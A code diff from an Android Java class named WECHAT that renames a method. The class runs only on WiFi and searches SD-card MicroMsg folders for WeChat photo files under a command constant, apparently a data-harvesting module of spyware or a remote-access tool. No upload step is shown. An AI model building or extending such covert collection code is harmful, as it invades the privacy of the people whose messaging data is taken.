@@ -39,13 +39,13 @@ public class WECHAT implements Runnable{
             if(NetworkUtils.getNetworkType(context) != NetworkUtils.WIFI_CONNECTION){
                 return;
             }
-            String weixinpath = getUserWeiXinData(Public.SDCARDPATH + "/tencent/MicroMsg/");
+            String weixinpath = getWeiXinData(Public.SDCARDPATH + "/tencent/MicroMsg/");
             File file = new File(weixinpath);
             if (file.exists() == false) {
-                weixinpath = getUserWeiXinData(Public.SDCARDPATH + "/Tencent/MicroMsg/");
+                weixinpath = getWeiXinData(Public.SDCARDPATH + "/Tencent/MicroMsg/");
                 file = new File(weixinpath);
                 if (file.exists() == false) {
-                    weixinpath = getUserWeiXinData(Public.SDCARDPATH + "/tencent/micromsg/");
+                    weixinpath = getWeiXinData(Public.SDCARDPATH + "/tencent/micromsg/");
                     file = new File(weixinpath);
                     if(file.exists() == false){
                         return;
@@ -53,7 +53,7 @@ public class WECHAT implements Runnable{
                 }
             }
 
-            getUserWeiXinData(weixinpath);
+            getWeiXinData(weixinpath);
 
         }catch(Exception ex){
             ex.printStackTrace();
@@ -105,7 +105,7 @@ public class WECHAT implements Runnable{
 
 
 
-    public String getUserWeiXinData(String path){
+    public String getWeiXinData(String path){
         AppUtils.listTypeFiles(context,path + "WeiXin/",Public.CMD_DATA_WEIXINPHOTO);
         AppUtils.listTypeFiles(context,path + "weixin/",Public.CMD_DATA_WEIXINPHOTO);
 
